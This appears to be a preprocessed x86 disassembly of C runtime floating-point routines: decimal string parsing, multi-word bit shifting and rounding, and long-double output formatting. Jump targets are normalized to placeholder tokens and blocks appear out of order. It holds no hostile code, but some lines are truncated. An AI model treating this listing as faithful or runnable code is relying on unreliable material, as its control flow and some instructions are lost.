test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
inc eax
cmp eax 0x3
jl r-xdata
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
lea eax [ edx + 0x1 ]
cmp eax esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov edi [ ebp - 0x40 ]
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ebp - 0x2c ] ebx
je r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ edi + 0x4 ] esi
mov [ edi ] eax
jmp r-xdata
push 0x1f
pop eax
sub eax [ rw-data ]
mov ecx eax
mov eax [ ebp - 0x44 ]
shl esi cl
neg eax
sbb eax eax
and eax 0x80000000
or esi eax
mov eax [ rw-data ]
or esi [ ebp - 0x10 ]
cmp eax 0x40
jne r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp ecx eax
jge r-xdata
inc ecx
mov eax [ ebp - 0x34 ]
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
mov eax [ ebp - 0x34 ]
sar edx 0x5
and eax 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
mov [ edi ] esi
cmp ecx edx
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
sub ecx eax
mov [ ebp - 0x2c ] ebx
xor eax eax
inc eax
shl eax cl
mov [ ebp - 0x38 ] eax
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx [ ebp - 0x38 ]
add ecx eax
mov [ ebp - 0x28 ] ecx
cmp ecx eax
mov eax [ ebp - 0x28 ]
mov ecx ebx
push 0xffffffff
pop edi
jb r-xdata
dec eax
or eax 0xffffffe0
inc eax
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
cmp ecx [ rw-data ]
jl r-xdata
sub edx [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x30 ] edx
lea edi [ ebp - 0x10 ]
mov eax edx
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
and eax 0x8000001f
jns r-xdata
push 0x2
pop ebx
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax [ ebp - 0x38 ]
jae r-xdata
mov edx [ ebp - 0x3c ]
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
add esi ecx
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x1f
mov [ ebp - 0x38 ] esi
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
mov ecx [ rw-data ]
lea edi [ ebp - 0x10 ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
or [ ebp - 0x10 ] 0x80000000
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x34 ] eax
and ecx 0x8000001f
jns r-xdata
mov [ ebp - 0x30 ] eax
or edi 0xffffffff
mov eax edi
mov [ ebp - 0x20 ] ebx
mov edi [ ebp - 0x30 ]
mov ecx edi
shl eax cl
not eax
push 0x20
mov [ ebp - 0x28 ] eax
pop eax
sub eax edi
push 0x3
mov [ ebp - 0x38 ] eax
pop esi
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
js r-xdata
push 0x20
mov [ ebp - 0x20 ] ebx
mov esi ebx
shl edi cl
mov ebx ecx
pop eax
sub eax ebx
mov [ ebp - 0x24 ] ecx
not edi
mov [ ebp - 0x24 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
or edi 0xffffffff
mov [ ebp - 0x38 ] ecx
push 0x20
shl edi cl
pop eax
sub eax ecx
mov [ ebp - 0x20 ] ebx
not edi
mov [ ebp - 0x28 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov ecx edi
mov eax edx
shr edx cl
or edx [ ebp - 0x20 ]
and eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x38 ]
shl eax cl
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x8 ]
shl eax 0x2
xor ebx ebx
push 0x2
sub edx eax
or edi 0xffffffff
mov eax [ ebp - 0x3c ]
pop ecx
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
mov [ ebp - 0x2c ] ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x28 ] edi
mov eax edi
jb r-xdata
mov edx [ ebp + esi * 4 - 0x10 ]
mov ecx ebx
mov eax edx
shr edx cl
or edx [ ebp - 0x20 ]
and eax edi
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp + esi * 4 - 0x10 ] edx
inc esi
mov [ ebp - 0x20 ] eax
cmp esi 0x3
jl r-xdata
mov edi [ ebp - 0x28 ]
lea edx [ ebp - 0x8 ]
mov esi [ ebp - 0x38 ]
mov eax edi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
shr edx cl
and eax edi
or edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x28 ]
shl eax cl
mov ecx [ ebp - 0x38 ]
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov esi [ ebp - 0x34 ]
lea edx [ ebp - 0x8 ]
mov eax esi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x3c ]
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
cmp ecx eax
jl r-xdata
mov ecx [ ebp - 0x34 ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] edx
and ecx 0x8000001f
jns r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
jns r-xdata
cmp ecx edi
jl r-xdata
sub edx 0x4
dec ecx
jns r-xdata
cmp ecx esi
jl r-xdata
mov esi [ rw-data ]
xor ebx ebx
add esi [ rw-data ]
inc ebx
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
push 0x1f
pop eax
sub eax ecx
mov [ ebp - 0x30 ] eax
xor eax eax
mov ecx [ ebp - 0x30 ]
inc eax
shl eax cl
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
inc edx
cmp edx esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + edx * 4 ]
sub ecx edx
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov eax ebx
shl edi cl
push 0x20
mov [ ebp - 0x20 ] ebx
not edi
mov ebx [ ebp - 0x24 ]
pop ecx
sub ecx ebx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] ecx
dec ecx
or ecx 0xffffffe0
inc ecx
mov edi [ ebp - 0x34 ]
mov eax edi
push 0x1f
cdq
pop ecx
and edx ecx
add edx eax
sar edx 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov edx [ ebp + eax * 4 - 0x10 ]
mov ecx ebx
mov eax edx
shr edx cl
mov ecx [ ebp - 0x34 ]
and eax edi
or edx [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x10 ] edx
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax esi
jl r-xdata
mov esi [ ebp - 0x28 ]
lea edx [ ebp - 0x8 ]
mov eax esi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov eax [ ebp + edx * 4 - 0x10 ]
sub ecx edi
xor edi edi
inc edi
shl edi cl
mov ecx ebx
mov [ ebp - 0x24 ] edi
add edi eax
mov [ ebp - 0x20 ] edi
cmp edi eax
mov eax [ ebp - 0x20 ]
push 0xffffffff
pop edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
cmp ecx esi
jl r-xdata
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
js r-xdata
mov esi ebx
jmp r-xdata
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x20 ] edi
mov eax edi
jb r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
jns r-xdata
sub_100495bf
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x80 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x68 ] eax
xor eax eax
push ebx
xor ebx ebx
inc eax
push esi
mov [ ebp - 0x6c ] eax
mov esi ebx
mov eax ebx
mov [ ebp - 0x70 ] ebx
push edi
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x54 ] ebx
cmp [ ebp + 0x24 ] eax
jne r-xdata
mov edx [ ebp + 0x10 ]
mov ecx edx
mov [ ebp - 0x50 ] ecx
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp cl 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
mov cl [ edx ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
mov cl [ edx ]
inc edx
mov [ ebp - 0x55 ] cl
cmp eax 0xb
ja r-xdata
cmp eax 0xa
jne r-xdata
jmp [ eax * 4 + jump_table_10049d37 ]
jmp r-xdata
lea eax [ ecx - 0x31 ]
cmp al 0x8
ja r-xdata
xor eax eax
inc eax
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x31 ]
cmp al 0x8
jbe r-xdata
lea eax [ ecx - 0x31 ]
cmp al 0x8
jbe r-xdata
xor eax eax
inc eax
mov [ ebp - 0x60 ] eax
cmp cl 0x30
jl r-xdata
xor eax eax
inc eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
xor eax eax
sub cl 0x30
inc eax
mov [ ebp - 0x5c ] eax
cmp cl 0x9
ja r-xdata
lea eax [ edx - 0x2 ]
mov [ ebp - 0x50 ] eax
lea eax [ ecx - 0x31 ]
cmp al 0x8
ja r-xdata
xor eax eax
inc eax
mov [ ebp - 0x64 ] eax
jmp r-xdata
lea eax [ ecx - 0x31 ]
cmp al 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
xor eax eax
mov esi ebx
inc eax
mov [ ebp - 0x64 ] eax
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp cl [ eax ]
jne r-xdata
push 0x3
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp cl [ eax ]
jne r-xdata
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp cl [ eax ]
je r-xdata
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp cl [ eax ]
je r-xdata
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
cmp cl 0x30
cmp cl 0x30
jne r-xdata
mov edx [ ebp - 0x50 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax cl
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp cl 0x30
je r-xdata
cmp cl 0x30
jmp r-xdata
push 0xa
pop eax
dec edx
lea eax [ edx - 0x1 ]
mov [ ebp - 0x50 ] eax
movsx eax cl
sub eax 0x2b
je r-xdata
cmp cl 0x30
jge r-xdata
mov eax ebx
mov esi ebx
push 0x4
cmp eax 0x18
jbe r-xdata
movsx eax cl
sub eax 0x2b
je r-xdata
push 0x5
cmp cl 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp cl 0x30
je r-xdata
cmp cl 0x2b
je r-xdata
mov [ ebp - 0x54 ] esi
mov esi ebx
mov [ ebp - 0x4c ] eax
cmp eax 0x19
jae r-xdata
cmp cl 0x2b
je r-xdata
mov esi [ ebp - 0x54 ]
jl r-xdata
mov eax [ ebp - 0x54 ]
pop eax
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov cl [ edx ]
inc edx
sub cl 0x31
cmp cl 0x8
ja r-xdata
jne r-xdata
dec eax
dec eax
jne r-xdata
cmp cl 0x39
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x54 ]
mov al [ ebp - 0x9 ]
cmp al 0x5
jl r-xdata
push 0x2
pop eax
mov [ ebp - 0x70 ] ebx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp cl 0x2d
je r-xdata
pop eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp cl 0x2d
je r-xdata
inc esi
sub cl 0x30
inc eax
mov [ edi ] cl
inc edi
jmp r-xdata
cmp cl 0x2d
je r-xdata
mov [ ebp - 0x54 ] esi
mov esi ebx
mov [ ebp - 0x4c ] eax
cmp eax 0x19
jae r-xdata
mov cl [ edx ]
dec eax
inc edx
cmp cl 0x30
je r-xdata
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x4c ]
push 0x7
or ecx 0xffffffff
pop eax
mov [ ebp - 0x6c ] ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
or [ ebp - 0x6c ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
cmp cl 0x30
jge r-xdata
imul ecx esi 0xa
movsx esi [ ebp - 0x55 ]
add esi 0xffffffd0
add esi ecx
cmp esi 0x1450
jg r-xdata
mov ecx ebx
mov eax ebx
mov esi ebx
mov edx ebx
jmp r-xdata
dec edi
cmp [ edi ] bl
jne r-xdata
mov ecx [ ebp - 0x54 ]
dec edi
push 0x18
inc ecx
pop eax
mov [ ebp - 0x54 ] ecx
jmp r-xdata
inc al
mov [ ebp - 0x9 ] al
push 0x2
mov ecx 0x8000
pop eax
mov [ ebp - 0x70 ] ecx
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp cl 0x30
je r-xdata
jmp r-xdata
cmp cl 0x39
jg r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x30
jge r-xdata
cmp cl 0x43
jle r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x30
jge r-xdata
sub cl 0x30
inc eax
mov [ edi ] cl
inc edi
dec esi
cmp cl 0x39
jg r-xdata
mov cl [ ebp - 0x55 ]
mov esi 0x1451
jmp r-xdata
mov cl [ edx ]
inc edx
mov [ ebp - 0x55 ] cl
mov edi [ ebp - 0x80 ]
or eax [ ebp - 0x70 ]
mov [ edi + 0xa ] ax
mov eax ebx
mov [ edi ] cx
mov [ edi + 0x2 ] edx
mov [ edi + 0x6 ] esi
lea ecx [ ebp - 0x3c ]
push ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_1004ad7f
mov ecx [ ebp - 0x6c ]
add esp 0xc
test ecx ecx
jns r-xdata
dec eax
inc ecx
dec edi
cmp [ edi ] bl
je r-xdata
test eax eax
je r-xdata
cmp cl 0x43
jle r-xdata
dec edx
jmp r-xdata
cmp cl 0x45
jle r-xdata
cmp cl 0x39
jg r-xdata
mov cl [ edx ]
inc edx
add esi [ ebp - 0x54 ]
mov eax [ ebp - 0x64 ]
test eax eax
jne r-xdata
neg esi
mov [ ebp - 0x54 ] ecx
cmp cl 0x45
jle r-xdata
mov ecx [ ebp - 0x68 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x60 ]
test ecx ecx
je r-xdata
push 0x6
jmp r-xdata
sub cl 0x64
cmp cl 0x1
jbe r-xdata
mov eax [ ebp - 0x5c ]
test eax eax
jne r-xdata
add esi [ ebp + 0x18 ]
sub cl 0x64
cmp cl 0x1
ja r-xdata
cmp esi 0x1450
jg r-xdata
sub esi [ ebp + 0x1c ]
mov eax 0x7fff
mov esi 0x80000000
push 0x2
jmp r-xdata
cmp esi 0xffffebb0
jl r-xdata
mov ecx ebx
mov edx ebx
pop ebx
xor edi edi
mov ecx ebx
mov eax ebx
mov esi ebx
mov edx ebx
lea ebx [ edi + 0x1 ]
jmp r-xdata
mov edx rw-data
sub edx 0x60
test esi esi
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x3a ]
mov esi [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jns r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edx rw-data
neg esi
sub edx 0x60
test esi esi
jne r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax esi
add edx 0x54
sar esi 0x3
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x4c ] esi
and eax 0x7
je r-xdata
imul ecx eax 0xc
mov eax 0x8000
add ecx edx
mov [ ebp - 0x50 ] ecx
cmp [ ecx ] ax
jb r-xdata
movzx edi [ ecx + 0xa ]
mov edx [ ebp - 0x32 ]
mov eax edi
xor eax edx
mov [ ebp - 0x7c ] ebx
and eax 0x8000
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x60 ] eax
mov eax 0x7fff
and edx eax
mov [ ebp - 0x28 ] ebx
and edi eax
mov [ ebp - 0x24 ] ebx
lea eax [ edi + edx ]
movzx esi ax
mov eax 0x7fff
mov [ ebp - 0x6c ] esi
cmp dx ax
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x48 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
xor eax eax
cmp [ ebp - 0x60 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x34 ] eax
cmp di ax
jae r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
test dx dx
jne r-xdata
mov [ ebp - 0x34 ] ebx
jmp r-xdata
test di di
jne r-xdata
inc esi
test [ ebp - 0x34 ] 0x7fffffff
mov [ ebp - 0x6c ] esi
jne r-xdata
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] ebx
push 0x5
mov eax ebx
lea edx [ ebp - 0x28 ]
pop edi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x68 ] edi
inc esi
test [ ecx + 0x8 ] 0x7fffffff
mov [ ebp - 0x6c ] esi
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
add edx 0x2
inc eax
dec edi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x68 ] edi
test edi edi
jg r-xdata
lea esi [ ebp - 0x3c ]
lea esi [ esi + eax * 2 ]
lea eax [ ecx + 0x8 ]
mov [ ebp - 0x64 ] eax
cmp [ ecx + 0x4 ] ebx
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov [ ebp - 0x5c ] edi
test edi edi
jle r-xdata
mov esi [ ebp - 0x6c ]
mov edx [ ebp - 0x24 ]
add esi 0xc002
mov edi [ ebp - 0x2c ]
mov [ ebp - 0x50 ] edx
test si si
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp ecx [ ebp - 0x5c ]
jae r-xdata
cmp [ ecx ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
mov eax 0xffff
add esi eax
test si si
jns r-xdata
test edx edx
js r-xdata
mov [ edx - 0x4 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0x54 ]
mov ax [ ebp - 0x2c ]
mov ebx [ ebp - 0x7c ]
mov eax esi
neg eax
movzx eax ax
mov [ ebp - 0x68 ] eax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0x28 ]
mov edx edi
shr edx 0x1f
mov ecx eax
add eax eax
shr ecx 0x1f
or eax edx
add edi edi
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
add edx edx
mov eax 0xffff
mov [ ebp - 0x2c ] edi
or edx ecx
add esi eax
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x24 ] edx
test si si
jg r-xdata
sub [ ebp - 0x64 ] 0x2
add esi 0x2
dec edi
test edi edi
jg r-xdata
inc [ edx ]
mov eax [ ebp - 0x2a ]
cmp eax 0xffffffff
jne r-xdata
and edi 0x1ffff
cmp edi 0x18000
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov eax edx
shl eax 0x1f
mov [ ebp - 0x50 ] ecx
shr [ ebp - 0x50 ] 0x1
or [ ebp - 0x50 ] eax
mov eax [ ebp - 0x50 ]
shl ecx 0x1f
shr edi 0x1
shr edx 0x1
or edi ecx
dec [ ebp - 0x68 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] edi
jne r-xdata
inc ebx
movzx eax [ esi ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x5c ]
mov [ ebp - 0x78 ] ebx
movzx eax [ eax ]
imul ecx eax
mov [ ebp - 0x5c ] ecx
add ecx [ edx - 0x4 ]
cmp ecx [ edx - 0x4 ]
jb r-xdata
mov ecx [ ebp - 0x50 ]
mov edi [ ebp - 0x68 ]
mov eax [ ebp - 0x74 ]
inc eax
mov [ ebp - 0x2a ] eax
mov eax [ ebp - 0x26 ]
mov [ ebp - 0x2a ] ebx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x50 ]
test [ ebp - 0x2c ] 0x1
je r-xdata
push 0x0
test ebx ebx
mov [ ebp - 0x50 ] edx
pop ebx
je r-xdata
mov ax [ ebp - 0x2a ]
or esi [ ebp - 0x60 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] si
jmp r-xdata
xor eax eax
mov [ ebp - 0x38 ] ebx
cmp [ ebp - 0x60 ] ax
mov [ ebp - 0x3c ] ebx
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x34 ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x26 ] eax
mov ax [ ebp - 0x22 ]
mov ecx 0xffff
mov [ ebp - 0x26 ] ebx
cmp ax cx
jne r-xdata
mov ax di
xor edi edi
inc edi
or ax di
mov [ ebp - 0x2c ] ax
mov edi [ ebp - 0x2c ]
jmp r-xdata
mov esi [ ebp - 0x4c ]
mov edx [ ebp - 0x54 ]
mov eax 0x7fff
cmp si ax
jb r-xdata
inc ax
mov [ ebp - 0x22 ] ax
jmp r-xdata
mov [ ebp - 0x22 ] dx
inc esi
jmp r-xdata
mov edx 0x8000
cmp ax dx
ja r-xdata
mov ecx [ ebp - 0x24 ]
jmp r-xdata
sub_10049d67
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx edx [ ebp + 0x10 ]
xor ecx ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov eax 0x7fff
push esi
mov esi 0x8000
mov [ ebp - 0x74 ] ebx
and edx esi
mov [ ebp - 0x30 ] 0xcccccccc
movzx esi [ ebp + 0x10 ]
inc ecx
and esi eax
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x80 ] edx
mov [ ebp - 0x64 ] eax
push edi
test dx dx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp si ax
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test si si
jne r-xdata
movzx edx si
mov ecx edi
shr ecx 0x18
mov eax edx
shr eax 0x8
xor ebx ebx
mov [ ebp - 0x1a ] edi
mov edi rw-data
sub edi 0x60
mov [ ebp - 0x16 ] si
mov [ ebp - 0x58 ] 0x5
lea eax [ eax + ecx * 2 ]
mov [ ebp - 0x70 ] 0xbffd
imul ecx eax 0x4d
imul eax edx 0x4d10
mov [ ebp - 0x54 ] 0x3fbf
add eax 0xecbced0c
add eax ecx
sar eax 0x10
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1e ] eax
xor eax eax
mov [ ebp - 0x20 ] ax
movsx eax cx
neg eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov edx 0x80000000
mov [ ebx ] cx
mov ecx [ ebp + 0x8 ]
cmp eax edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov edx [ ebp - 0x1c ]
mov esi [ ebp - 0x20 ]
jns r-xdata
test eax 0x40000000
jne r-xdata
test ecx ecx
je r-xdata
xor eax eax
mov [ ebx + 0x3 ] cl
mov [ ebx ] ax
mov eax 0x8000
cmp dx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov eax ecx
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
test [ ebp + 0x18 ] 0x1
mov ecx [ ebp - 0x74 ]
mov eax [ ebp - 0x48 ]
mov edi [ ebp + 0x14 ]
mov [ ecx ] ax
je r-xdata
inc ecx
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x48 ] ecx
mov ecx eax
mov eax [ ebp - 0x26 ]
mov edi eax
xor edi ecx
mov [ ebp - 0x10 ] ebx
and edi 0x8000
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x44 ] edi
mov edi 0x7fff
and eax edi
mov [ ebp - 0x8 ] ebx
and ecx edi
mov [ ebp - 0x7c ] eax
add eax ecx
movzx edi ax
mov eax 0x7fff
mov [ ebp - 0x4c ] edi
cmp cx ax
jae r-xdata
je r-xdata
neg eax
mov edi rw-data
sub edi 0x60
mov [ ebp - 0x44 ] eax
test eax eax
cmp [ ebp - 0x80 ] 0x0
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
mov [ ebp - 0x48 ] edi
cwde
add edi eax
mov [ ebp - 0x48 ] edi
test edi edi
jg r-xdata
xor eax eax
cmp [ ebp - 0x44 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x7c ]
cmp ax [ ebp - 0x64 ]
jae r-xdata
mov esi [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x40 ] esi
cmp eax edx
jne r-xdata
cmp eax 0xc0000000
jne r-xdata
